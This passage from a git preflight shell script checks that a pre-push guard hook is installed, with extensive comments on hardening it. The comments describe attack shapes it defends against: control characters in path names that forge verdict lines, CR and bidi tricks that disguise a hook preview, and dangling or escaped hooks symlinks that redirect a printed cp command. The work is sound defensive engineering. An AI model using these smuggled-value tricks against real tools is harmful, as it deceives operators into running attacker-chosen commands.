  #     containment caught. Shipping a defence with no fixture that dies without it is shipping a claim.
  #     THAT MEASUREMENT WAS NARROWER THAN THE SENTENCE IT JUSTIFIED, and the security re-review's
  #     finding MED-1 is the proof: the fixture set it ran against contained no `.git/hooks -> /`, the
  #     ONE shape where containment did NOT catch what `[ -h ]` would have (guard_resolve_deep returned
  #     the empty string with rc 0 for the root, so containment was skipped entirely). "Every escape it
  #     caught, containment caught" was true of the fixtures and false of the claim — which is the
  #     failure mode this file names one screen down at the `hooks-dir-symlink` fixture: a fixture set
  #     that does not carry the attack's essential property tests something else and reports it as the
  #     thing you asked for. THE TRIGGER IS STILL NOT REINSTATED, deliberately: it would restore the
  #     cry-wolf below, and it would patch one SHAPE of a defect the resolver had for every caller
  #     (`_g_lnk` and `_g_hdir` in the refusal block use the same helper). The resolver is the general
  #     defect and is where the fix went; leg D3 is the fixture the earlier mutation run lacked.
  #   * IT CRIED WOLF. The one shape it caught alone is a hooks dir symlinked to somewhere INSIDE the
  #     worktree (`.git/hooks -> <top>/shared-hooks`) — a real pattern for teams who want hooks under
  #     version control. That writes nothing outside the repository, so it is not the harm this predicate
  #     names; and refusing it withholds the install command from a legitimate setup with no way to get
  #     it back, which is the cry-wolf failure doctor.sh:18 warns about. A prescription in a brief is a
  #     hypothesis, not a patch.
  # Containment is also the more general form: a `.git` that is itself a symlink, a hooks dir reached
  # through a symlinked ancestor, or a `--git-dir` pointing elsewhere all produce the same escape with no
  # link on the leaf. It answers the question the refusal actually needs answered — "would the command I
  # am about to print write outside this repository?" — and is blind to how the escape was constructed.
  #
  # CONTAINMENT IS AGAINST TWO ROOTS, NOT ONE — the git common dir AND the worktree top-level. The task
  # brief specified the common dir alone; that is WRONG, and measured so (2026-07-21, git 2.48.1) rather
  # than argued: from a LINKED WORKTREE with the no-op `core.hooksPath=.git/hooks`, `--git-path hooks`
  # answers `<wt>/.git/hooks` while `--git-common-dir` answers `<main>/.git`, so the one-root test calls
  # an ordinary linked worktree an escape. It turned leg H3 RED — the leg that exists because that exact
  # config must be JUDGED from a worktree rather than silently skipped. A repository is its git dir AND
  # its worktree; a path inside either is not "outside the repository", and the harm this predicate
  # exists to prevent is stated in those words.
  #
  # BOTH SIDES RESOLVE EXISTENCE-INDEPENDENTLY (guard_resolve_deep, Rule 3's second form): the hooks dir
  # legitimately may not exist (an empty `--template` — the Y1/MP12 repo shape) and in the H3 lane
  # neither does its parent, and a resolver that failed there would answer "escapes" on an ordinary repo
  # and suppress a correct install command. UNRESOLVABLE => NOT an escape: this predicate only ever
  # WITHHOLDS a command, so failing it closed would cry wolf while failing it open leaves today's
  # behaviour untouched. The escape it is written for resolves fine.
  # THAT LAST SENTENCE IS ONLY AS TRUE AS THE RESOLVER, and finding MED-1 is what it cost when it was
  # not: guard_resolve_deep answered the ROOT with the empty string and rc 0, so `.git/hooks -> /` —
  # an escape that resolves perfectly well — took this fail-open arm anyway. The `[ -n … ] || return 1`
  # below cannot distinguish "no such path" from "the resolver lost the value", so this arm is a
  # fail-open whose safety is entirely a property of guard_resolve_deep. Fixed there, locked by D3, and
  # recorded here because the next person to add a resolver caller inherits the same dependency.
  # NOT CALLED WHEN core.hooksPath REDIRECTS — that stanza returns first, so a husky/lefthook adopter
  # whose hooks dir is deliberately elsewhere never reaches this and is never judged by it.
  _ghe_hd=$(dirname -- "$1") || return 1
  _ghe_hd=$(guard_resolve_deep "$_ghe_hd") || return 1
  [ -n "$_ghe_hd" ] || return 1
  for _ghe_root in "$(git rev-parse --git-common-dir 2>/dev/null)" "$(git rev-parse --show-toplevel 2>/dev/null)"; do
    [ -n "$_ghe_root" ] || continue
    _ghe_r=$(guard_resolve_deep "$_ghe_root") || _ghe_r=""
    [ -n "$_ghe_r" ] || continue
    # The trailing slash on both sides makes this a PATH-COMPONENT prefix test, not a string one:
    # without it `<top>/.gitmodules-hooks` would count as inside `<top>/.git`. The pattern side is a
    # quoted expansion, so a glob metacharacter in the repo path is literal (the W3 measurement).
    case "$_ghe_hd/" in "${_ghe_r%/}"/*) return 1 ;; esac
  done
  return 0
}

guard_sha256() {  # <path> -> its sha256, or empty when no hasher is available
  # X1: the HUMAN is the verifier, so the human needs something to verify AGAINST. Degrades to empty
  # rather than failing — a missing hasher must not turn a refusal into an error, and the caller says
  # so in as many words instead of printing a blank where a digest belongs.
  if command -v shasum >/dev/null 2>&1; then
    shasum -a 256 -- "$1" 2>/dev/null | cut -d' ' -f1
  elif command -v sha256sum >/dev/null 2>&1; then
    sha256sum -- "$1" 2>/dev/null | cut -d' ' -f1
  fi
}

# THERE IS DELIBERATELY NO `guard_excerpt` HERE — RULE 4, and the reason it exists.
#
# NEVER RENDER UNTRUSTED CONTENT INSIDE A SECURITY VERDICT. REFERENCE IT.
#
# The T3 refusal printed the candidate hook's first 6 lines, "rendered inert" by a `    | ` prefix, a
# `tr -d` control-character range and a width bound. The security re-review BLOCKED on it (finding H-1)
# and the owner ratified DELETING the feature rather than widening the filter. Both halves of that are
# load-bearing, so both are recorded:
#
#   * NO BYTE FILTER CLOSES THE CLASS. The shipped range omitted CR (\015) — MEASURED (2026-07-21): a
#     hostile `hooks/pre-push` whose lines were `x<CR><a real kit-guard line>` rendered the `    | `
#     prefix AWAY (CR returns the cursor to column 0) and the preview was INDISTINGUISHABLE from the
#     genuine guard, while the payload sat on line 7, one line below the window. Terminal selection
#     copies RENDERED cells, so the human pastes the attacker's line. Adding CR and NUL to the range
#     would not have fixed it: bidi/RLO (U+202E) reorders the rendering and a `tr` under LC_ALL=C cannot
#     see it at all. The attack is a RENDERING substitution and every defence available here operates on
#     BYTES — which is also why the leg guarding it (MP10) was GREEN while the attack worked.
#   * EVEN UNATTACKED IT HAD NEGATIVE VALUE (finding L-1). A 6-line preview presented as the human's
#     evidence, with a payload on line 7 invisible, MANUFACTURES ASSURANCE IT CANNOT DELIVER: it makes a
#     reader who glanced at it feel they checked, which is worse than a reader who knows they have not.
#
# What replaces it is a REFERENCE, not a rendering: the absolute path, the sha256, the affordances that
# can actually discriminate (`less`, `git log -p`) and — because the digest and the human's paste are
# separated by a TOCTOU window no shell script can close — an explicit instruction to re-check. Locked
# by leg MP10, whose claim is now "no line of the file appears in the output", which is decidable,
# rather than "the rendered content is inert", which is not.

guard_hookspath_is_noop() {  # <core.hooksPath value> -> 0 (true) iff it names the repo's DEFAULT hooks dir
  # A core.hooksPath of `.git/hooks` (some tooling writes exactly that) redirects NOTHING, so treating
  # "the key is set" as "the key redirects" would go silent on exactly the unguarded state K11 catches.
  # Compare PHYSICAL dirs instead.
  #
  # COMPARED AGAINST `--git-common-dir`/hooks — the repo's DEFAULT hooks dir — and deliberately NOT
  # against dirname("$GUARD_HOOK"). CORRECTED PREMISE (measured 2026-07-21, git 2.48.1; the earlier
  # comment here asserted the opposite and was WRONG): `git rev-parse --git-path hooks/pre-push` DOES
  # honour core.hooksPath — with hooksPath=.husky it answers `.husky/pre-push`, and `--git-path hooks`
  # answers `.husky`, while `--git-path objects` still answers `.git/objects` (the special-casing is
  # hooks-specific). So dirname("$GUARD_HOOK") is the REDIRECTED dir and would compare equal to
  # core.hooksPath ALWAYS — the skip would never fire and every husky/lefthook adopter would be judged.
  # `--git-common-dir` is unaffected by the setting (measured: `.git` in all three states) and, from a
  # linked worktree, absolute and pointing at the MAIN .git — which is exactly the dir W1/W2 pin.
  # VERSION-ROBUST EITHER WAY: on a git where --git-path is hooksPath-aware, GUARD_HOOK points into the
  # foreign dir but we skip before judging it; on one where it is not, GUARD_HOOK points at the default
  # dir and we still skip. The redirect case never reaches a verdict, and the no-op case yields
  # `.git/hooks/pre-push` under both behaviours.
  #
  # RESOLUTION RULE for a RELATIVE value (measured): it resolves against the WORKTREE TOP-LEVEL, not the
  # cwd — git chdir's to the top-level before running a hook, so `.myhooks` found <top>/.myhooks even
  # when the git command was issued from <top>/a/b. Resolving against the cwd would be wrong from any
  # subdirectory.
  #
  # TWO ROOTS, NOT ONE — the linked-worktree lane (G1; measured 2026-07-21, git 2.48.1, by installing a
  # marker hook and watching whether it FIRED, not by reading rev-parse):
  #   no core.hooksPath        -> <main>/.git/hooks/<hook> RUNS from the main tree AND from a linked worktree
  #   hooksPath=.git/hooks     -> RUNS from the main tree (and from any subdir of it); from a LINKED
  #                               WORKTREE it does NOT run AT ALL — the relative value resolves against
  #                               the worktree top-level, where `.git` is a FILE, so the configured dir
  #                               <wt>/.git/hooks does not exist and git executes nothing
  #   hooksPath=<abs>/.git/hooks -> RUNS from both
  # So from a linked worktree that value is not a no-op and not a redirect: it is a DANGLING pointer that
  # disables hooks. Both readings share the only thing the skip cares about — no OTHER TOOL owns a hooks
  # dir here, so the deference the skip exists to grant has no beneficiary, and the tree must be judged.
  # Hence the SECOND resolution attempt below, rooted at the MAIN worktree (the common dir's parent):
  # without it the same .git/config produced OPPOSITE verdicts from the two trees — MISS+armed from the
  # main tree, a disclosed skip from the worktree. That was a fail-OPEN nested inside the fail-safe.
  # Locked by leg H3.
  # UNRESOLVABLE AGAINST EITHER ROOT => NOT a no-op, i.e. the caller SKIPS. That is the status-quo
  # behaviour and the direction that can never cry wolf on a repo whose hooks another tool owns.
  # BOTH SIDES RESOLVE EXISTENCE-INDEPENDENTLY (guard_resolve — Rule 3 above), and doing only one side
  # would be worse than doing neither. MEASURED (2026-07-21, the Y1 finding): the old form required the
  # DEFAULT hooks dir to exist; in a repo created with an empty `--template` it does not, `_hp_def` came
  # back empty, the function answered "not a no-op", and the caller took the DISCLOSED SKIP on a
  # genuinely unguarded incepted tree — fail-open, and the exact opposite of what design §8 says happens
  # to a value naming the repo's own default hooks dir. Locked by leg H4.
  #
  # WHICH HALVES ARE INDEPENDENTLY LOAD-BEARING — MEASURED BY MUTATION (2026-07-21), because the review
  # brief asserted this and got the detail wrong, and an unmeasured "both sides are needed" is the same
  # class of claim this fix-loop keeps finding:
  #   revert `_hp_def` alone                     -> H4 dies      (the def side IS independently needed)
  #   revert the VALUE side's attempt 1 alone    -> H4 SURVIVES  (attempt 2, the main-worktree retry,
  #                                                 also uses guard_resolve and rescues it from the
  #                                                 main tree — the only tree H4 runs in)
  #   revert BOTH value attempts                 -> H4 dies      (the value side as a whole IS needed)
  # So attempt 1's guard_resolve is defence-in-depth with no independent kill on today's fixtures, and
  # that is stated rather than implied: it is kept for one-helper consistency (Rule 3) and because a
  # future fixture reaching attempt 1 without attempt 2 would otherwise silently regress.
  _hp_cd=$(git rev-parse --git-common-dir 2>/dev/null) || _hp_cd=""
  [ -n "$_hp_cd" ] || return 1
  _hp_def=$(guard_resolve "$_hp_cd/hooks") || _hp_def=""
  case "$1" in
    /*) _hp_abs=$(guard_resolve "$1") || _hp_abs="" ;;
    *)  _hp_top=$(git rev-parse --show-toplevel 2>/dev/null) || _hp_top=""
        _hp_abs=""
        [ -z "$_hp_top" ] || _hp_abs=$(guard_resolve "$_hp_top/$1") || _hp_abs=""
        if [ -z "$_hp_abs" ]; then
          # Attempt 2 — the MAIN worktree root, reached through the .git-file indirection that
          # --git-common-dir already followed for us. NARROWED TO THE UNRESOLVABLE CASE ON PURPOSE: when
          # attempt 1 resolves, git's own answer stands and this never runs, so a real redirect that
          # exists in the worktree (a checked-out `.husky/`) still skips exactly as before. Still
          # reachable after the guard_resolve change: in a LINKED WORKTREE `<wt>/.git` is a FILE, so the
          # PARENT of `<wt>/.git/hooks` cannot be cd'd into either and attempt 1 still fails (leg H3).
          _hp_main=$(guard_resolve "$_hp_cd/..") || _hp_main=""
          [ -z "$_hp_main" ] || _hp_abs=$(guard_resolve "$_hp_main/$1") || _hp_abs=""
        fi ;;
  esac
  [ -n "$_hp_abs" ] && [ -n "$_hp_def" ] && [ "$_hp_abs" = "$_hp_def" ]
}

check_guard_installed() {
  [ "$(guard_tree_class)" = incepted ] || return 0     # N/A: silent, no output (anti-wolf)
  # --git-path, not a hardcoded .git/hooks/ — the two diverge under a linked worktree (measured on git
  # 2.48.1: from a linked worktree --git-path yields the SHARED <main>/.git/hooks/pre-push, because hooks
  # live in the common dir, while the worktree's own .git is a FILE — so the hardcoded form reports a
  # FALSE MISS on a correctly guarded tree). incept.sh:951 already uses this form; inception-done.sh:68
  # does not, and that weaker convention is not propagated here. Locked by legs W1/W2.
  GUARD_HOOK=$(git rev-parse --git-path hooks/pre-push 2>/dev/null) || return 0
  [ -n "$GUARD_HOOK" ] || return 0
  # --git-path answers RELATIVE TO THE CWD (measured, git 2.48.1: from <repo>/a/b it yields
  # ../../.git/hooks/pre-push). Detection is unaffected, but the refusal block in the main body — grep
  # `if [ "$GUARD_REFUSE" -eq 1 ]`, the durable anchor; NO LINE NUMBER, because it drifts and did (the
  # T2 fix-loop's own edits moved it, and a stale number here is this file's recurring failure) — prints a
  # `cp "<src>" "$GUARD_HOOK"` line the reader is meant to PASTE (design §4.5) — and a cwd-relative path
  # in that line is a broken command anywhere but the dir preflight happened to run in. Absolutize ONCE,
  # here, so the message, the refusal and the hooksPath comparison below all see a single canonical
  # form. (Until T2 wired the call site and that block this sentence described a refusal that did not
  # exist — the comment was written in the present tense against unbuilt code, which is this file's own
  # recurring failure: a comment standing in for execution. It is now true.) The refusal
  # absolutizes the SOURCE half of that command by the same route, for the same reason. Locked by leg
  # W3 at the function level and by legs MP1/MP5 through the real run.
  # NOT `--path-format=absolute`: that flag landed in git 2.31, and this script's git floor (:36-37) is
  # a WARN-AND-DEGRADE floor, not a hard requirement — an older git must still get a correct answer, not
  # an "unknown option" error. `cd` + `pwd -P` is version-agnostic.
  case "$GUARD_HOOK" in
    /*) : ;;
    *)  # The parent dir may not exist (e.g. a --git-dir pointing at a pruned tree). Leaving GUARD_HOOK
        # relative there is strictly no worse than before, and the failure must NOT abort under `set -e`
        # — hence the `if`, not a trailing `[ … ] && …` (whose non-zero status would kill the run).
        # guard_resolve_DEEP, not guard_resolve: this path is printed into a command a human PASTES, so
        # it must come out absolute even when `.git/hooks` itself is missing (an empty --template). The
        # shallow form leaves it relative there, which the Y1 fix made reachable — see that helper's
        # note for why the hooksPath comparison must keep the shallow one. Locked by leg MP12.
        _gh_abs=$(guard_resolve_deep "$GUARD_HOOK") || _gh_abs=""
        if [ -n "$_gh_abs" ]; then GUARD_HOOK="$_gh_abs"; fi ;;
  esac
  # HOSTILE PATH => REFUSE WITHOUT PRINTING IT (Rule 2 / finding X3b). Every line below names a path,
  # and a path carrying a real newline forges whole lines into this check's verdict — measured, it
  # forged a complete `cp … && chmod +x …` block INSIDE the branch whose purpose is to refuse one. The
  # only sound answer is to not print it: the verdict says WHAT is wrong and never echoes the value.
  # FAIL-CLOSED, not silent — going quiet here would hand an attacker a way to switch the check OFF by
  # naming a directory, which is strictly worse than the forgery. Locked by legs E2/E3.
  if guard_path_hostile "$GUARD_HOOK"; then
    echo "Runtime guard:"
    echo "  MISS pre-push guard — this repository's path contains a CONTROL CHARACTER"
    GUARD_STATE=hostile-path; GUARD_REFUSE=1
    return 0
  fi
  # core.hooksPath REDIRECTS git's hook lookup. An earlier revision of this comment claimed, as
  # "measured", that `git rev-parse --git-path hooks/…` does NOT honour it. THAT WAS WRONG — re-measured
  # 2026-07-21 on git 2.48.1, --git-path IS hooksPath-aware (see guard_hookspath_is_noop). The old claim
  # survived only because the skip used to run BEFORE the rev-parse, so nothing ever observed it; M2's
  # reordering is what exposed it. The DECISION is unchanged and does not rest on the wrong premise: a
  # husky/lefthook adopter — brownfield is a supported lane, docs/adoption/brownfield.md — owns that
  # hooks dir, and the kit deliberately does not reach into it, install into it, or pass judgment on
  # what another tool put there. So: DISCLOSED SKIP, arming nothing. A wrong refusal on a legitimate
  # setup is the cry-wolf failure doctor.sh:18 warns about.
  # But SET is not REDIRECTS: core.hooksPath=.git/hooks is a no-op some tooling writes, and skipping
  # there would go silent on exactly the unguarded state K11 exists to catch. So the skip is conditioned
  # on guard_hookspath_is_noop — which is a NAMING test, not a "does it differ" test, and the difference
  # matters: the value is judged a no-op when it NAMES the repo's default hooks dir against either the
  # current worktree's top-level or the main worktree's (see that function's TWO ROOTS note). From a
  # linked worktree `.git/hooks` does not resolve at all against the first root and git in fact runs
  # NOTHING there — but it still names no other tool's hooks dir, so it is judged, not skipped. An
  # earlier revision of this comment claimed the skip was conditioned on the dirs "actually DIFFERING";
  # that OVERSTATED the code, which skipped from a linked worktree on a value that differs from nothing.
  # Locked by legs H1 (a real redirect skips), H2 (the no-op setting is judged normally from the main
  # tree) and H3 (the identical config is judged the SAME way from a linked worktree).
  # SCOPE IS PART OF THE VERDICT (finding X4). `git config --get` reads local, global AND system scope,
  # but the message this stanza used to print said "this repo manages its own hooks" — a statement about
  # the REPO, made from a value that may have come from `~/.gitconfig`. MEASURED (2026-07-21): one line
  # in a global config (common with husky, lefthook and corporate setups) made K11 silent and green in
  # EVERY incepted repo on the machine, saying the repo manages hooks it never asked to manage. The
  # deference the skip exists to grant is owed to a repo that opted in — a machine-wide default is not
  # that opt-in, and it is exactly the fleet-wide silence this slice exists to remove.
  # `--local --get` is the version-agnostic scope test (measured: rc 1 + empty when the value is
  # global-only, the value itself when the repo set it); `--show-scope` would be cleaner but landed in
  # git 2.26 and this script's git floor is WARN-AND-DEGRADE, not a requirement.
  # Locked by legs H1 (local scope keeps the deferential wording) and H5 (a non-local scope WARNS).
  _hp=$(git config --get core.hooksPath 2>/dev/null) || _hp=""
  _hp_local=$(git config --local --get core.hooksPath 2>/dev/null) || _hp_local=""
  if [ -n "$_hp" ] && guard_path_hostile "$_hp"; then
    # Rule 2 applied to the CONFIG VALUE as well as to the path. This closes E1's disclosed residual:
    # git un-escapes `"a\nb"` in a quoted config value into a REAL newline, which `printf '%s\n'`
    # passes straight through and which the old comment recorded as unfixable-from-here. It is not
    # unfixable; it is the same parse-time rejection, applied to the second input. Locked by leg E3.
    echo "Runtime guard:"
    echo "  MISS pre-push guard — core.hooksPath contains a CONTROL CHARACTER; refusing to echo it"
    GUARD_STATE=hostile-path; GUARD_REFUSE=1
    return 0
  fi
  if [ -n "$_hp" ] && ! guard_hookspath_is_noop "$_hp"; then
    # printf with the config value as an ARGUMENT to %s, never inside the format string: dash's builtin
    # `echo` expands backslash escapes, so a core.hooksPath containing a literal `\n` could synthesise
    # an extra line into a security check's verdict. Locked by leg E1 (which also records why the
    # mutation kill is shell-dependent while the assertion is not). A security fix with no leg is a
    # claim, not a control.
    echo "Runtime guard:"
    if [ "$_hp_local" = "$_hp" ]; then
      printf '%s\n' "  skip pre-push guard — core.hooksPath is set to '$_hp'; this repo manages its own hooks."
      printf '%s\n' "       The kit is NOT judging $_hp/pre-push. Install the guard there yourself if you want it."
    else
      # NOT the reassuring per-repo wording, and not silence either. The operator is told the truth:
      # nothing in this repository asked for a redirect, the kit's guard is not in force here, and the
      # setting that silenced the judgment lives somewhere else on this machine. Advisory (`rec`), not
      # a refusal — a global hooksPath is a legitimate configuration and refusing on it would be the
      # cry-wolf failure doctor.sh:18 warns about; but a green that says nothing is what X4 measured.
      printf '%s\n' "  warn pre-push guard NOT IN FORCE — a core.hooksPath set OUTSIDE this repository"
      printf '%s\n' "       (global or system scope, not .git/config) redirects hooks to '$_hp'."
      printf '%s\n' "       Nothing in THIS repository asked for that, and the kit's guard is not running."
      printf '%s\n' "       Unset it, set a repo-local core.hooksPath, or install the guard at $_hp/pre-push."
      rec=1
    fi
    return 0
  fi
  echo "Runtime guard:"
  if [ -h "$GUARD_HOOK" ] && [ ! -e "$GUARD_HOOK" ]; then
    # DANGLING SYMLINK IS ITS OWN STATE (finding X6). `[ -f ]` FOLLOWS symlinks, so a dangling
    # `.git/hooks/pre-push -> /elsewhere` answered "absent" — and the `cp` this script then printed
    # writes THROUGH the link to the link's target and `chmod +x`s it. MEASURED (2026-07-21): pasting
    # the emitted fix created an executable file at an attacker-chosen path outside the repo.
    # The precondition is local write access to `.git/`, so this is hardening rather than a live
    # attack — but "absent" is the wrong ANSWER regardless, and the fix for it (`cp`) is the wrong
    # FIX: removing the link is. A `-h` test before `-f` is the whole change. Locked by leg D1.
    printf '%s\n' "  MISS pre-push guard — $GUARD_HOOK is a DANGLING SYMLINK (a cp here would write through it)"
    GUARD_STATE=dangling; GUARD_REFUSE=1
  elif [ ! -f "$GUARD_HOOK" ]; then
    # printf '%s\n', NOT echo — this was the ONE variable-interpolating `echo` left in the new code,
    # in direct contradiction of the rule this file states at the refusal block ("printf '%s\n' — not
    # echo — for every line carrying a path"). MEASURED under /bin/dash, which IS /bin/sh on the
    # ubuntu-latest runner that executes this in CI: a directory named `e\nok   pre-push guard
    # installed and executable\n` made this line print a forged `ok` verdict. The rule was already
    # written; it had simply been applied to one of its two instances. Locked by leg E2.
    printf '%s\n' "  MISS pre-push guard — not installed at $GUARD_HOOK"
    GUARD_STATE=absent; GUARD_REFUSE=1
  elif [ ! -r "$GUARD_HOOK" ]; then
    # UNREADABLE must be its own state, checked BEFORE the marker grep. `grep -q … 2>/dev/null` cannot
    # tell "no marker" from "cannot read", so an unreadable hook that DOES carry KIT_GUARD_CORE would
    # fall through to the foreign branch and be affirmatively mislabelled "foreign hook preserved" while
    # arming nothing — fail-open behind a reassuring message. Design §8 claims absent, inert, OR
    # UNREADABLE refuses, so the code moves to the design rather than the design to the code.
    # ACCEPTED COST, disclosed not accidental: because this branch precedes the marker grep, a FOREIGN
    # hook that happens to be unreadable is ALSO refused — a brownfield hook with restrictive
    # permissions is punished, which §4.3 ("a foreign hook is never punished") otherwise forbids. That
    # is deliberate and unavoidable in this order: unreadable cannot be distinguished from unmarked, so
    # the only alternative is to call an unverifiable hook foreign — which is precisely the fail-open
    # this branch exists to close. Refusing (recoverable: `chmod +r`) beats reassuring (silent).
    # DISCLOSED DIVERGENCE: inception-done.sh:71 has the identical hole; repairing it is a follow-up row
    # (design §10 already carries its sibling, the :68 hardcoded-path row) and is NOT done from here.
    echo "  MISS pre-push guard present but UNREADABLE — cannot verify it is the kit's"
    GUARD_STATE=unreadable; GUARD_REFUSE=1
  elif ! guard_is_kit_hook "$GUARD_HOOK"; then
    # A foreign hook is never punished (§4.3) — but if it is not executable then git runs NOTHING on
    # push, and wording that implies a hook is in force would be a false reassurance. Say what is true.
    if [ -x "$GUARD_HOOK" ]; then
      echo "  ok   pre-push hook present but not the kit's (foreign hook preserved — brownfield)"
    else
      echo "  ok   pre-push hook present but not the kit's, and not executable — nothing runs on push; the kit does not manage it"
    fi
  elif [ ! -x "$GUARD_HOOK" ]; then
    echo "  MISS pre-push guard present but not executable — git silently ignores it"
    GUARD_STATE=inert; GUARD_REFUSE=1
  else
    echo "  ok   pre-push guard installed and executable"
    # THE CEILING BELONGS ON THE HAPPY PATH TOO (finding J5). Until now only the REFUSED operator was
    # told this hook is a speed bump — and the operator who sees `ok` is the one most likely to read it
    # as "main is protected", which it is not: the solo enforce_admins:false bypass is server-side and
    # `--no-verify` skips the hook outright. One line, deliberately: the happy path must not be bloated,
    # and the full statement is one `cat` away at the doc named here.
    echo "       (a SPEED BUMP, not a boundary — --no-verify skips it and the server-side solo-admin bypass remains; docs/enterprise/platform-safety-boundary.md)"
  fi
  # M-1 — THE HOOKS DIRECTORY ITSELF ESCAPED. Deliberately AFTER the cascade and CONDITIONED ON A
  # REFUSAL ALREADY BEING ARMED, rather than being a branch of its own at the top. The reason is the
  # cry-wolf rule this file keeps applying: a `.git/hooks -> /shared/git-hooks` symlink is a real
  # (if unusual) setup, and if the kit's guard IS installed and executable there then git RUNS it and the
  # tree is genuinely guarded — an `ok` verdict is TRUE and converting it into a MISS would punish a
  # working configuration. What the escape actually breaks is the FIX: every command the refusal block
  # offers (`cp`, `chmod +x`, `rm`) would act on a file outside this repository's git dir. So the escape
  # re-labels the states that emit a command and touches nothing else. All four are covered, not just the
  # `absent` one that was reported — `dangling`'s `rm`, `inert`'s `chmod +x` and `unreadable`'s `chmod +r`
  # name the same escaped path. `hostile-path` cannot reach here (it returns above) and must not: its
  # whole contract is that no path is examined or printed.
  # BOTH HALVES MEASURED (2026-07-21), not reasoned — the placement argument above is exactly the kind of
  # claim this file keeps finding stated and unchecked:
  #   `.git/hooks -> <outside>` + the kit guard installed and executable there
  #        -> `ok   pre-push guard installed and executable`, rc 0. No wolf; git really does run it.
  #   same, but the hook there is INERT     -> hooks-escape, NO `chmod +x` naming the outside path, rc 1
  #   same, but the leaf there is DANGLING  -> hooks-escape, NO `rm` naming the outside path, rc 1
  # Leg D2 locks the `absent` route; the other two share the one `case` arm D2 drives, so the arm is
  # locked and the STATES that reach it are stated here rather than each carrying a near-duplicate leg.
  if [ "$GUARD_REFUSE" -eq 1 ] && guard_hooks_dir_escapes "$GUARD_HOOK"; then
    echo "  MISS the HOOKS DIRECTORY resolves OUTSIDE this repository's git dir — no fix command can be offered"
    GUARD_STATE=hooks-escape
  fi
}

check_repo_class() {  # warn when the repo is user-owned PRIVATE (SLSA provenance gate skips there)
  if [ -z "${PREFLIGHT_GH_CMD:-}" ] && ! command -v gh >/dev/null 2>&1; then
    echo "  skip repo-class — gh not installed (cannot detect repo visibility)"; return 0
  fi
  _json=$(${PREFLIGHT_GH_CMD:-gh repo view --json isPrivate,isInOrganization} 2>/dev/null) || _json=""
  if [ -z "$_json" ]; then
    echo "  skip repo-class — gh unavailable/unauthenticated/offline (run 'gh auth login')"; return 0
  fi
  _priv=$(printf '%s' "$_json" | jq -r '.isPrivate' 2>/dev/null || echo "")
  _org=$(printf '%s' "$_json"  | jq -r '.isInOrganization' 2>/dev/null || echo "")  # isInOrganization is gh's proxy for the gate's owner.type == 'Organization'
  if [ "$_priv" = "true" ] && [ "$_org" = "false" ]; then
    echo "  warn repo is user-owned PRIVATE — SLSA provenance gate will SKIP (make it public or move to an org for build attestation)"
    rec=1
  elif [ "$_priv" = "true" ] || [ "$_priv" = "false" ]; then
    echo "  ok   repo class supports the provenance gate (public or org-owned)"
  else
    echo "  skip repo-class — could not parse repo metadata"
  fi
}

check_workflows_valid() {  # surface workflow validity via the existing conformance check (reuse, never reimplement)
  _cmd="${ACTIONLINT_VALID_CMD:-}"
  if [ "$_cmd" = "__skip__" ]; then
    echo "  skip workflows — actionlint-valid.sh / actionlint not available"; return 0
  fi
  if [ -z "$_cmd" ]; then
    if [ ! -f conformance/actionlint-valid.sh ]; then
      echo "  skip workflows — conformance/actionlint-valid.sh not present (pruned?)"; return 0
    fi
    if [ -z "${ACTIONLINT_BIN:-}" ] && ! command -v actionlint >/dev/null 2>&1; then
      echo "  skip workflows — actionlint not installed (set ACTIONLINT_BIN or install actionlint)"; return 0
    fi
    _cmd="sh conformance/actionlint-valid.sh"
  fi
  if $_cmd >/dev/null 2>&1; then
    echo "  ok   workflows valid (actionlint via conformance/actionlint-valid.sh)"
  else
    echo "  warn an invalid GitHub Actions workflow — run 'sh conformance/actionlint-valid.sh' for details"
    rec=1
  fi
}

check_codeowners_placeholders() {  # standing re-check of @your-org placeholders (incept warns once; this re-warns any time)
  _paths="${CODEOWNERS_PATHS:-.github/CODEOWNERS .gitlab/CODEOWNERS}"
  _found=""
  _any=0
  for _co in $_paths; do
    [ -f "$_co" ] || continue
    _any=1
    if grep -q '@your-org' "$_co" 2>/dev/null; then _found="$_found $_co"; fi
  done
  [ "$_any" -eq 0 ] && return 0   # N/A — no CODEOWNERS yet (pre-inception): print nothing
  if [ -n "$_found" ]; then
    printf '%s\n' "  warn$_found still has @your-org/* placeholders — replace with real teams before enabling owner review"   # Rule 3
    rec=1
  else
    echo "  ok   CODEOWNERS has no @your-org placeholders"
  fi
}

# SEAMS: are the test injection seams (PREFLIGHT_GIT_VERSION_CMD) live? Only an explicit FLAG turns them
# on — never the ambient environment. Default 0 = a real adopter run reports on the real machine.
STACK=""; SELFTEST=0; ALLOW_NESTED=0; SEAMS=0; ALLOW_RUNTIME_MISMATCH=0
while [ $# -gt 0 ]; do
  case "$1" in
    --stack) [ $# -ge 2 ] || { echo "preflight: --stack requires a value" >&2; exit 2; }; STACK=$2; shift 2 ;;
    --selftest) SELFTEST=1; SEAMS=1; shift ;;
    # --selftest-e2e: internal. Runs the REAL body with the injection seams live, so --selftest can prove
    # the git-floor check is WIRED end-to-end (a defined-but-uncalled check is decorative) without an
    # ambient env var being able to do the same thing in an adopter's shell. Not in --help: it is a test
    # seam, not a user-facing option, and the flag IS the authorization.
    --selftest-e2e) SEAMS=1; shift ;;
    --allow-nested) ALLOW_NESTED=1; shift ;;
    # --allow-runtime-mismatch: the NAMED escape from the stack's runtime floor. It proceeds on an
    # unsupported runtime, loudly, and suppresses the clean green — see the runtime-floor block above.
    --allow-runtime-mismatch) ALLOW_RUNTIME_MISMATCH=1; shift ;;
    -h|--help) echo "usage: preflight.sh [--stack <name>] [--allow-runtime-mismatch] [--selftest] [--allow-nested]"; exit 0 ;;
    *) printf '%s\n' "preflight: unknown arg: $1" >&2; exit 2 ;;   # Rule 3 — $1 is raw argv
  esac
done

if [ "$SELFTEST" -eq 1 ]; then
  fail=0
  if command -v kit_definitely_absent_tool_xyz >/dev/null 2>&1; then
    echo "FAIL: sentinel tool unexpectedly exists"; fail=1
  else
    echo "PASS: absent tool detected as missing"
  fi
  if command -v sh >/dev/null 2>&1; then echo "PASS: present tool (sh) detected"; else echo "FAIL: sh not detected"; fail=1; fi
  if stack_tools __nope__ >/dev/null 2>&1; then echo "FAIL: unknown stack not handled"; fail=1; else echo "PASS: unknown stack handled gracefully"; fi
  if stack_tools python >/dev/null 2>&1; then echo "PASS: known stack mapped"; else echo "FAIL: known stack not mapped"; fail=1; fi
  miss=0; recommend kit_definitely_absent_tool_xyz "x" >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: recommend warns without failing (miss untouched)"; else echo "FAIL: recommend set miss"; fail=1; fi

